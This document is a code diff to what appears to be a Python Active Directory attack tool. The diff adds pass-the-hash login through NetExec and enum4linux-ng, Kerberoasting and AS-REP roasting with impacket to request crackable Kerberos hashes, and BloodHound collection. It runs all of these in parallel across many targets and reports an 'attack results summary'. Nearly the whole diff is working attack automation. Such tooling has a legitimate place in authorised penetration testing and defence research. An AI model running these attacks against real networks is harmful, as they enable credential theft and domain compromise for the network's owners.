@@ -6,6 +6,7 @@ import asyncio
 import subprocess
 import logging
 import os
+import random
 from typing import Dict, List, Optional
 from utils import save_enumeration_result, is_command_available
 
@@ -13,12 +14,20 @@ from utils import save_enumeration_result, is_command_available
 class AuthEnumerator:
     """Authenticated enumeration using domain/local credentials"""
     
-    def __init__(self, output_dir: str, username: str, password: str, local_auth: bool = False):
+    def __init__(self, output_dir: str, username: str, password: str, local_auth: bool = False, ntlm_hash: str = None):
         self.output_dir = output_dir
         self.username = username
         self.password = password
+        self.ntlm_hash = ntlm_hash
         self.local_auth = local_auth
         self.logger = logging.getLogger('adtool')
+        
+        # Parse NTLM hash if provided
+        if self.ntlm_hash:
+            self.lm_hash, self.nt_hash = self._parse_ntlm_hash(ntlm_hash)
+        else:
+            self.lm_hash = None
+            self.nt_hash = None
         
         # Parse domain and username
         if '/' in username:
@@ -39,12 +48,48 @@ class AuthEnumerator:
             self.logger.warning("Neither 'nxc' nor 'netexec' found. Authenticated enumeration will be limited.")
         
         self.has_enum4linux = is_command_available('enum4linux-ng')
+        self.has_kerberoast = is_command_available('impacket-GetUserSPNs')
+        self.has_asrep = is_command_available('impacket-GetNPUsers')
+        self.has_bloodhound = is_command_available('bloodhound-python')
         
         self.logger.info(f"Initialized authenticated enumerator for user: {self.username}")
+        if self.ntlm_hash:
+            self.logger.info("Using NTLM hash authentication")
         if self.local_auth:
             self.logger.info("Using local authentication")
         else:
             self.logger.info("Using domain authentication")
+        
+        # Log tool availability
+        tool_status = []
+        if self.nxc_cmd:
+            tool_status.append(f"NetExec: {self.nxc_cmd}")
+        if self.has_enum4linux:
+            tool_status.append("enum4linux-ng")
+        if self.has_kerberoast:
+            tool_status.append("impacket-GetUserSPNs")
+        if self.has_asrep:
+            tool_status.append("impacket-GetNPUsers")
+        if self.has_bloodhound:
+            tool_status.append("bloodhound-python")
+        
+        if tool_status:
+            self.logger.info(f"Available tools: {', '.join(tool_status)}")
+        else:
+            self.logger.warning("No enumeration tools found!")
+    
+    def _parse_ntlm_hash(self, ntlm_hash: str) -> tuple:
+        """Parse NTLM hash in format LM:NT or :NT"""
+        if ':' in ntlm_hash:
+            parts = ntlm_hash.split(':', 1)
+            lm_hash = parts[0] if parts[0] else None
+            nt_hash = parts[1] if parts[1] else None
+        else:
+            # If no colon, assume it's just the NT hash
+            lm_hash = None
+            nt_hash = ntlm_hash
+        
+        return lm_hash, nt_hash
     
     async def enumerate_targets(self, ips: List[str]) -> Dict:
         """Perform authenticated enumeration on targets"""
@@ -62,78 +107,120 @@ class AuthEnumerator:
             'results': []
         }
         
-        # Run authenticated enumeration for each IP
-        for ip in ips:
-            self.logger.info(f"Running authenticated enumeration for {ip}")
-            ip_results = await self._enumerate_target(ip)
-            results['results'].append(ip_results)
+        # Run authenticated enumeration for all IPs in parallel
+        self.logger.info(f"Running authenticated enumeration for {len(ips)} targets in parallel")
+        ip_tasks = [self._enumerate_target(ip) for ip in ips]
+        ip_results = await asyncio.gather(*ip_tasks, return_exceptions=True)
+        
+        # Process results
+        for result in ip_results:
+            if result and not isinstance(result, Exception):
+                results['results'].append(result)
+            elif isinstance(result, Exception):
+                self.logger.error(f"Target enumeration failed: {result}")
         
         return results
     
     async def _enumerate_target(self, ip: str) -> Dict:
         """Run all authenticated enumeration checks for a single target"""
+        self.logger.info(f"Starting enumeration for {ip}")
+        
         target_result = {
             'ip': ip,
             'checks': []
         }
         
-        # SMB share enumeration
-        shares_result = await self._enumerate_smb_shares(ip)
-        if shares_result:
-            target_result['checks'].append(shares_result)
+        # Run domain auth checks in parallel
+        domain_checks = [
+            self._enumerate_smb_shares(ip),
+            self._check_password_policy(ip),
+            self._check_winrm_access(ip),
+            self._check_rdp_access(ip),
+            self._enumerate_ldap_user_descriptions(ip),
+            self._run_enum4linux(ip),
+            self._kerberoasting(ip),
+            self._asrep_roasting(ip),
+            self._bloodhound_collection(ip)
+        ]
         
-        # Password policy check
-        passpol_result = await self._check_password_policy(ip)
-        if passpol_result:
-            target_result['checks'].append(passpol_result)
+        # Execute all domain auth checks in parallel
+        domain_results = await asyncio.gather(*domain_checks, return_exceptions=True)
         
-        # WinRM access check
-        winrm_result = await self._check_winrm_access(ip)
-        if winrm_result:
-            target_result['checks'].append(winrm_result)
+        # Add successful results to checks
+        for result in domain_results:
+            if result and not isinstance(result, Exception):
+                target_result['checks'].append(result)
+            elif isinstance(result, Exception):
+                self.logger.error(f"Check failed for {ip}: {result}")
         
-        # RDP access check
-        rdp_result = await self._check_rdp_access(ip)
-        if rdp_result:
-            target_result['checks'].append(rdp_result)
-        
-        # LDAP user description enumeration
-        ldap_users_result = await self._enumerate_ldap_user_descriptions(ip)
-        if ldap_users_result:
-            target_result['checks'].append(ldap_users_result)
-        
-        # enum4linux-ng enumeration
-        enum4linux_result = await self._run_enum4linux(ip)
-        if enum4linux_result:
-            target_result['checks'].append(enum4linux_result)
-        
-        # If local_auth is enabled, run all checks again with --local-auth
+        # If local_auth is enabled, run local auth checks in parallel
         if self.local_auth:
-            # SMB shares with local auth
-            shares_local_result = await self._enumerate_smb_shares(ip, local_auth=True)
-            if shares_local_result:
-                target_result['checks'].append(shares_local_result)
+            local_checks = [
+                self._enumerate_smb_shares(ip, local_auth=True),
+                self._check_password_policy(ip, local_auth=True),
+                self._check_winrm_access(ip, local_auth=True),
+                self._check_rdp_access(ip, local_auth=True)
+            ]
             
-            # Password policy with local auth
-            passpol_local_result = await self._check_password_policy(ip, local_auth=True)
-            if passpol_local_result:
-                target_result['checks'].append(passpol_local_result)
+            # Execute all local auth checks in parallel
+            local_results = await asyncio.gather(*local_checks, return_exceptions=True)
             
-            # WinRM with local auth
-            winrm_local_result = await self._check_winrm_access(ip, local_auth=True)
-            if winrm_local_result:
-                target_result['checks'].append(winrm_local_result)
-            
-            # RDP with local auth
-            rdp_local_result = await self._check_rdp_access(ip, local_auth=True)
-            if rdp_local_result:
-                target_result['checks'].append(rdp_local_result)
+            # Add successful results to checks
+            for result in local_results:
+                if result and not isinstance(result, Exception):
+                    target_result['checks'].append(result)
+                elif isinstance(result, Exception):
+                    self.logger.error(f"Local auth check failed for {ip}: {result}")
         
         return target_result
     
+    async def _run_nxc_command(self, cmd: List[str], max_retries: int = 3) -> tuple:
+        """Run nxc command with retry logic to handle parallel execution issues"""
+        for attempt in range(max_retries):
+            try:
+                # Add small random delay to stagger parallel processes
+                if attempt > 0:
+                    delay = random.uniform(0.1, 0.5)
+                    await asyncio.sleep(delay)
+                
+                process = await asyncio.create_subprocess_exec(
+                    *cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE
+                )
+                
+                stdout, stderr = await process.communicate()
+                
+                # Check if it's the FileExistsError from nxc
+                if b"FileExistsError" in stderr and b"nxc_hosted" in stderr:
+                    if attempt < max_retries - 1:
+                        self.logger.debug(f"nxc temporary directory conflict, retrying... (attempt {attempt + 1}/{max_retries})")
+                        continue
+                
+                return stdout.decode(), stderr.decode(), process.returncode
+                
+            except Exception as e:
+                if attempt < max_retries - 1:
+                    self.logger.debug(f"Command execution error, retrying... (attempt {attempt + 1}/{max_retries}): {e}")
+                    continue
+                else:
+                    raise
+        
+        # If all retries failed
+        raise Exception(f"Failed to execute command after {max_retries} attempts")
+
+    
     async def _enumerate_smb_shares(self, ip: str, local_auth: bool = False) -> Dict:
         """Enumerate SMB shares with credentials"""
-        cmd = [self.nxc_cmd, 'smb', ip, '-u', self.user, '-p', self.password, '--shares']
+        cmd = [self.nxc_cmd, 'smb', ip, '-u', self.user]
+        
+        # Use hash or password
+        if self.nt_hash:
+            cmd.extend(['-H', self.nt_hash])
+        else:
+            cmd.extend(['-p', self.password])
+        
+        cmd.append('--shares')
         
         if local_auth:
             cmd.append('--local-auth')
@@ -142,15 +229,10 @@ class AuthEnumerator:
         
         try:
             self.logger.info(f"Enumerating SMB shares on {ip} ({auth_type} auth)")
+            self.logger.info(f"cmd: {' '.join(cmd)}")
             
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            
-            stdout, stderr = await process.communicate()
-            output = stdout.decode() + stderr.decode()
+            stdout, stderr, returncode = await self._run_nxc_command(cmd)
+            output = stdout + stderr
             
             # Save results
             filename = f"smb_shares_{auth_type}_{ip}.txt"
@@ -164,7 +246,7 @@ class AuthEnumerator:
                 'command': ' '.join(cmd),
                 'output': output,
                 'file': file_path,
-                'success': process.returncode == 0
+                'success': returncode == 0
             }
             
         except Exception as e:
@@ -173,7 +255,15 @@ class AuthEnumerator:
     
     async def _check_password_policy(self, ip: str, local_auth: bool = False) -> Dict:
         """Check password policy"""
-        cmd = [self.nxc_cmd, 'smb', ip, '-u', self.user, '-p', self.password, '--pass-pol']
+        cmd = [self.nxc_cmd, 'smb', ip, '-u', self.user]
+        
+        # Use hash or password
+        if self.nt_hash:
+            cmd.extend(['-H', self.nt_hash])
+        else:
+            cmd.extend(['-p', self.password])
+        
+        cmd.append('--pass-pol')
         
         if local_auth:
             cmd.append('--local-auth')
@@ -183,14 +273,8 @@ class AuthEnumerator:
         try:
             self.logger.info(f"Checking password policy on {ip} ({auth_type} auth)")
             
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            
-            stdout, stderr = await process.communicate()
-            output = stdout.decode() + stderr.decode()
+            stdout, stderr, returncode = await self._run_nxc_command(cmd)
+            output = stdout + stderr
             
             # Save results
             filename = f"password_policy_{auth_type}_{ip}.txt"
@@ -204,7 +288,7 @@ class AuthEnumerator:
                 'command': ' '.join(cmd),
                 'output': output,
                 'file': file_path,
-                'success': process.returncode == 0
+                'success': returncode == 0
             }
             
         except Exception as e:
@@ -213,7 +297,13 @@ class AuthEnumerator:
     
     async def _check_winrm_access(self, ip: str, local_auth: bool = False) -> Dict:
         """Check WinRM access"""
-        cmd = [self.nxc_cmd, 'winrm', ip, '-u', self.user, '-p', self.password]
+        cmd = [self.nxc_cmd, 'winrm', ip, '-u', self.user]
+        
+        # Use hash or password
+        if self.nt_hash:
+            cmd.extend(['-H', self.nt_hash])
+        else:
+            cmd.extend(['-p', self.password])
         
         if local_auth:
             cmd.append('--local-auth')
@@ -223,14 +313,8 @@ class AuthEnumerator:
         try:
             self.logger.info(f"Checking WinRM access on {ip} ({auth_type} auth)")
             
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            
-            stdout, stderr = await process.communicate()
-            output = stdout.decode() + stderr.decode()
+            stdout, stderr, returncode = await self._run_nxc_command(cmd)
+            output = stdout + stderr
             
             # Save results
             filename = f"winrm_access_{auth_type}_{ip}.txt"
@@ -250,7 +334,7 @@ class AuthEnumerator:
                 'output': output,
                 'file': file_path,
                 'login_success': login_success,
-                'success': process.returncode == 0
+                'success': returncode == 0
             }
             
         except Exception as e:
@@ -259,7 +343,13 @@ class AuthEnumerator:
     
     async def _check_rdp_access(self, ip: str, local_auth: bool = False) -> Dict:
         """Check RDP access"""
-        cmd = [self.nxc_cmd, 'rdp', ip, '-u', self.user, '-p', self.password]
+        cmd = [self.nxc_cmd, 'rdp', ip, '-u', self.user]
+        
+        # Use hash or password
+        if self.nt_hash:
+            cmd.extend(['-H', self.nt_hash])
+        else:
+            cmd.extend(['-p', self.password])
         
         if local_auth:
             cmd.append('--local-auth')
@@ -269,14 +359,8 @@ class AuthEnumerator:
         try:
             self.logger.info(f"Checking RDP access on {ip} ({auth_type} auth)")
             
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            
-            stdout, stderr = await process.communicate()
-            output = stdout.decode() + stderr.decode()
+            stdout, stderr, returncode = await self._run_nxc_command(cmd)
+            output = stdout + stderr
             
             # Save results
             filename = f"rdp_access_{auth_type}_{ip}.txt"
@@ -296,7 +380,7 @@ class AuthEnumerator:
                 'output': output,
                 'file': file_path,
                 'login_success': login_success,
-                'success': process.returncode == 0
+                'success': returncode == 0
             }
             
         except Exception as e:
@@ -305,19 +389,21 @@ class AuthEnumerator:
     
     async def _enumerate_ldap_user_descriptions(self, ip: str) -> Dict:
         """Enumerate LDAP user descriptions"""
-        cmd = [self.nxc_cmd, 'ldap', ip, '-u', self.user, '-p', self.password, '-M', 'get-desc-users']
+        cmd = [self.nxc_cmd, 'ldap', ip, '-u', self.user]
+        
+        # Use hash or password
+        if self.nt_hash:
+            cmd.extend(['-H', self.nt_hash])
+        else:
+            cmd.extend(['-p', self.password])
+        
+        cmd.extend(['-M', 'get-desc-users'])
         
         try:
             self.logger.info(f"Enumerating LDAP user descriptions on {ip}")
             
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            
-            stdout, stderr = await process.communicate()
-            output = stdout.decode() + stderr.decode()
+            stdout, stderr, returncode = await self._run_nxc_command(cmd)
+            output = stdout + stderr
             
             # Save results
             filename = f"ldap_user_descriptions_{ip}.txt"
@@ -331,7 +417,7 @@ class AuthEnumerator:
                 'command': ' '.join(cmd),
                 'output': output,
                 'file': file_path,
-                'success': process.returncode == 0
+                'success': returncode == 0
             }
             
         except Exception as e:
@@ -355,10 +441,19 @@ class AuthEnumerator:
             # Simplified directory structure
             enum_dir = os.path.join(self.output_dir, "smb")
         
-        cmd = ['enum4linux-ng', ip, '-u', self.user, '-p', self.password, '-oY', os.path.join(enum_dir, f"{output_file}.txt")]
+        cmd = ['enum4linux-ng', ip, '-u', self.user]
+        
+        # enum4linux-ng uses -p for password and -H for hash
+        if self.nt_hash:
+            cmd.extend(['-H', self.nt_hash])
+        else:
+            cmd.extend(['-p', self.password])
+        
+        cmd.extend(['-oY', os.path.join(enum_dir, f"{output_file}.txt")])
         
         try:
             self.logger.info(f"Running enum4linux-ng on {ip} with credentials")
+            self.logger.info(f"cmd: {' '.join(cmd)}")
             
             process = await asyncio.create_subprocess_exec(
                 *cmd,
@@ -389,6 +484,176 @@ class AuthEnumerator:
             self.logger.error(f"enum4linux-ng authenticated scan failed for {ip}: {e}")
             return None
     
+    async def _kerberoasting(self, ip: str) -> Dict:
+        """Perform Kerberoasting attack using impacket-GetUserSPNs"""
+        if not self.has_kerberoast:
+            self.logger.warning("impacket-GetUserSPNs not found. Skipping Kerberoasting.")
+            return None
+        
+        if not self.domain:
+            self.logger.warning("Domain not specified. Skipping Kerberoasting.")
+            return None
+        
+        # impacket-GetUserSPNs uses -hashes format LM:NT
+        if self.ntlm_hash:
+            cmd = ['impacket-GetUserSPNs', '-request', '-dc-ip', ip, '-hashes', self.ntlm_hash, f'{self.domain}/{self.user}']
+        else:
+            cmd = ['impacket-GetUserSPNs', '-request', '-dc-ip', ip, f'{self.domain}/{self.user}:{self.password}']
+        
+        try:
+            self.logger.info(f"Performing Kerberoasting on {ip}")
+            self.logger.info(f"cmd: {' '.join(cmd)}")
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await process.communicate()
+            output = stdout.decode() + stderr.decode()
+            
+            # Save results
+            filename = f"kerberoasting_{ip}.txt"
+            file_path = save_enumeration_result(
+                self.output_dir, ip, 'kerberoasting', output, filename,
+                service_type='ldap', authenticated=True
+            )
+            
+            # Check if any SPNs were found
+            spns_found = '$krb5tgs$' in output or 'ServicePrincipalName' in output
+            
+            return {
+                'type': 'kerberoasting',
+                'command': ' '.join(cmd),
+                'output': output,
+                'file': file_path,
+                'spns_found': spns_found,
+                'success': process.returncode == 0
+            }
+            
+        except Exception as e:
+            self.logger.error(f"Kerberoasting failed for {ip}: {e}")
+            return None
+    
+    async def _asrep_roasting(self, ip: str) -> Dict:
+        """Perform AS-REP roasting attack using impacket-GetNPUsers"""
+        if not self.has_asrep:
+            self.logger.warning("impacket-GetNPUsers not found. Skipping AS-REP roasting.")
+            return None
+        
+        if not self.domain:
+            self.logger.warning("Domain not specified. Skipping AS-REP roasting.")
+            return None
+        
+        # impacket-GetNPUsers uses -hashes format LM:NT
+        if self.ntlm_hash:
+            cmd = ['impacket-GetNPUsers', '-request', '-dc-ip', ip, '-hashes', self.ntlm_hash, f'{self.domain}/{self.user}']
+        else:
+            cmd = ['impacket-GetNPUsers', '-request', '-dc-ip', ip, f'{self.domain}/{self.user}:{self.password}']
+        
+        try:
+            self.logger.info(f"Performing AS-REP roasting on {ip}")
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await process.communicate()
+            output = stdout.decode() + stderr.decode()
+            
+            # Save results
+            filename = f"asrep_roasting_{ip}.txt"
+            file_path = save_enumeration_result(
+                self.output_dir, ip, 'asrep_roasting', output, filename,
+                service_type='ldap', authenticated=True
+            )
+            
+            # Check if any vulnerable users were found
+            vulnerable_users = '$krb5asrep$' in output or 'UF_DONT_REQUIRE_PREAUTH' in output
+            
+            return {
+                'type': 'asrep_roasting',
+                'command': ' '.join(cmd),
+                'output': output,
+                'file': file_path,
+                'vulnerable_users': vulnerable_users,
+                'success': process.returncode == 0
+            }
+            
+        except Exception as e:
+            self.logger.error(f"AS-REP roasting failed for {ip}: {e}")
+            return None
+    
+    async def _bloodhound_collection(self, ip: str) -> Dict:
+        """Collect BloodHound data using bloodhound-python"""
+        if not self.has_bloodhound:
+            self.logger.warning("bloodhound-python not found. Skipping BloodHound collection.")
+            return None
+        
+        if not self.domain:
+            self.logger.warning("Domain not specified. Skipping BloodHound collection.")
+            return None
+        
+        # Create output directory for BloodHound files
+        bloodhound_dir = os.path.join(self.output_dir, 'bloodhound')
+        
+        cmd = [
+            'bloodhound-python', 
+            '-d', self.domain,
+            '-u', self.user,
+            '-ns', ip,
+            '-c', 'all',
+            '--zip'
+        ]
+        
+        # bloodhound-python uses --hashes for NT hash only
+        if self.ntlm_hash:
+            # BloodHound only needs the NT hash
+            cmd.extend(['--hashes', self.ntlm_hash])
+        else:
+            cmd.extend(['-p', self.password])
+        
+        try:
+            self.logger.info(f"cmd: {' '.join(cmd)}")
+            self.logger.info(f"Collecting BloodHound data from {ip}")
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                cwd=bloodhound_dir
+            )
+            
+            stdout, stderr = await process.communicate()
+            output = stdout.decode() + stderr.decode()
+            
+            # Save command output to bloodhound directory
+            filename = f"bloodhound_collection_{ip}.txt"
+            file_path = save_enumeration_result(
+                self.output_dir, ip, 'bloodhound_collection', output, filename,
+                service_type='bloodhound', authenticated=True
+            )
+            
+            # Check if collection was successful
+            collection_success = 'Done in' in output or '.zip' in output
+            
+            return {
+                'type': 'bloodhound_collection',
+                'command': ' '.join(cmd),
+                'output': output,
+                'file': file_path,
+                'collection_success': collection_success,
+                'output_dir': bloodhound_dir,
+                'success': process.returncode == 0
+            }
+            
+        except Exception as e:
+            self.logger.error(f"BloodHound collection failed for {ip}: {e}")
+            return None
+    
     async def generate_summary(self, results: Dict) -> str:
         """Generate a summary of authenticated enumeration results"""
         if 'error' in results:
@@ -405,6 +670,12 @@ class AuthEnumerator:
             'winrm': [],
             'rdp': [],
             'smb': []
+        }
+        
+        attack_results = {
+            'kerberoasting': [],
+            'asrep_roasting': [],
+            'bloodhound': []
         }
         
         for target_result in results['results']:
@@ -430,6 +701,28 @@ class AuthEnumerator:
                     successful_logins['smb'].append(ip)
                     summary_lines.append(f"  [+] SMB shares accessible")
                 
+                # Handle new attack techniques
+                if check_type == 'kerberoasting':
+                    if check.get('spns_found', False):
+                        attack_results['kerberoasting'].append(ip)
+                        summary_lines.append(f"  [+] Kerberoasting: SPNs found!")
+                    else:
+                        summary_lines.append(f"  [-] Kerberoasting: No SPNs found")
+                
+                if check_type == 'asrep_roasting':
+                    if check.get('vulnerable_users', False):
+                        attack_results['asrep_roasting'].append(ip)
+                        summary_lines.append(f"  [+] AS-REP Roasting: Vulnerable users found!")
+                    else:
+                        summary_lines.append(f"  [-] AS-REP Roasting: No vulnerable users")
+                
+                if check_type == 'bloodhound_collection':
+                    if check.get('collection_success', False):
+                        attack_results['bloodhound'].append(ip)
+                        summary_lines.append(f"  [+] BloodHound: Data collection successful")
+                    else:
+                        summary_lines.append(f"  [-] BloodHound: Data collection failed")
+                
                 if success:
                     summary_lines.append(f"  [+] {check_type}: Success")
                 else:
@@ -449,6 +742,21 @@ class AuthEnumerator:
         
         summary_lines.append(f"SMB access: {len(successful_logins['smb'])} targets")
         for ip in successful_logins['smb']:
+            summary_lines.append(f"  - {ip}")
+        
+        # Attack results summary
+        summary_lines.append("")
+        summary_lines.append("=== ATTACK RESULTS SUMMARY ===")
+        summary_lines.append(f"Kerberoasting hits: {len(attack_results['kerberoasting'])} targets")
+        for ip in attack_results['kerberoasting']:
+            summary_lines.append(f"  - {ip}")
+        
+        summary_lines.append(f"AS-REP Roasting hits: {len(attack_results['asrep_roasting'])} targets")
+        for ip in attack_results['asrep_roasting']:
+            summary_lines.append(f"  - {ip}")
+        
+        summary_lines.append(f"BloodHound collections: {len(attack_results['bloodhound'])} targets")
+        for ip in attack_results['bloodhound']:
             summary_lines.append(f"  - {ip}")
         
         # Save summary to file
